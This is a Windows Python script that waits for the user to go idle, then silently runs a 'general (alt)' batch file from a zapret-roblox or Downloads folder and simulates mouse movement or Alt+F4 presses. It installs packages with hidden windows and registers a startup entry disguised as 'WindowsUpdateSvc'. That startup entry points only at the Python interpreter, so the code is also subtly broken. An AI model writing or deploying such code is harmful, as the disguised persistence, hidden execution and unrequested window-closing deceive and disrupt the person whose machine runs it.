import os
import sys
import time
import ctypes
import subprocess
import random
import winreg


def install_required_packages():
    required_packages = ['pyautogui']
    installed = []
    
    # Получаем список установленных пакетов
    try:
        import pkg_resources
        installed_packages = [d.project_name for d in pkg_resources.working_set]
    except ImportError:
        # Если pkg_resources недоступен, устанавливаем pip и получаем список
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pip"],
                             creationflags=0x08000000)
        result = subprocess.run([sys.executable, "-m", "pip", "list"],
                               capture_output=True, text=True,
                               creationflags=0x08000000)
        installed_packages = [line.split()[0] for line in result.stdout.split('\n')[2:] if line.strip()]
    
    for package in required_packages:
        if package not in installed_packages:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package],
                                     creationflags=0x08000000)
                installed.append(package)
            except Exception:
                pass  # Если не удалось установить, продолжаем выполнение
    
    # Импортируем pyautogui после установки
    global pyautogui
    import pyautogui




def add_to_startup():
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    exe_path = sys.executable
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "WindowsUpdateSvc", 0, winreg.REG_SZ, exe_path)
    except Exception:
        pass


def get_idle_time():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [('cbSize', ctypes.c_uint), ('dwTime', ctypes.c_uint)]
    
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo))
    millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    return millis / 1000.0


def find_and_run_batch():
    search_paths = [
        os.path.join(os.environ['USERPROFILE'], 'Desktop', 'zapret-roblox'),
        os.path.join(os.environ['USERPROFILE'], 'Downloads')
    ]
    
    for path in search_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.lower().startswith("general (alt)") and file.endswith(".bat"):
                        batch_path = os.path.join(root, file)
                        try:
                            subprocess.Popen(batch_path, creationflags=0x08000000)
                            return True
                        except Exception:
                            pass
    return False


def perform_random_action():
    choice = random.random()
    if choice <= 0.1:  # 10% вероятность нажатия Alt+F4
        pyautogui.hotkey('alt', 'f4')
    else:  # 90% вероятность движения мыши
        start_time = time.time()
        while time.time() - start_time < 2:  # 2 секунды
            pyautogui.moveRel(5, -5, duration=0.1)  # Плавное движение вправо и вверх
            time.sleep(0.1)


def main():
    install_required_packages()
    add_to_startup()
    
    while True:
        idle_time = get_idle_time()
        
        if idle_time > 180:  # 3 минуты бездействия
            batch_found = find_and_run_batch()
            
            if batch_found:
                perform_random_action()
                
                # Ждать 600 секунд перед следующей проверкой
                time.sleep(600)
        
        # Проверка каждые 15 секунд
        time.sleep(15)


if __name__ == "__main__":
    main()
